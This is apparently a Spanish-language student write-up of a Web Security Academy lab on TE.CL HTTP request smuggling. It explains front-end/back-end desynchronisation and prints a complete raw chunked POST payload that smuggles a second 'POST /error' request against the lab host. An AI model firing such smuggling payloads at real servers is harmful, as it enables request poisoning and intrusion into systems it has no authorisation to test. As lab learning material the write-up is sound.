En esta clase trabajamos con una variante de HTTP request smuggling basada en la combinación TE.CL, donde el front-end permite codificación chunked y el back-end no. El objetivo es verificar si existe una desincronización entre ambos servidores manipulando los encabezados de longitud y codificación de la petición.

A través de dos envíos consecutivos desde Burp Repeater, provocamos una situación donde la segunda petición se ve afectada por los restos interpretados desde la primera, desencadenando una respuesta 404 inesperada en la raíz del sitio. Esta diferencia de comportamiento confirma la presencia del fallo, lo que nos permite avanzar hacia una posible explotación completa en una clase posterior.

Solucion
entonces con BS vamos a interceptar la web y vamos a cambiar el metodo get a post y lo ponemos en http:1.1
ponemos el payload
![Pasted_image_20250807210152.png](/Imagenes/Pasted_image_20250807210152.png)
POST / HTTP/1.1

Host: 0a2700a704a32a8f82dc6a1d00bb004a.web-security-academy.net

Transfer-Encoding: chunked

Content-Length: 4



38

POST /error HTTP/1.1

Content-Length: 30



testing=test

0





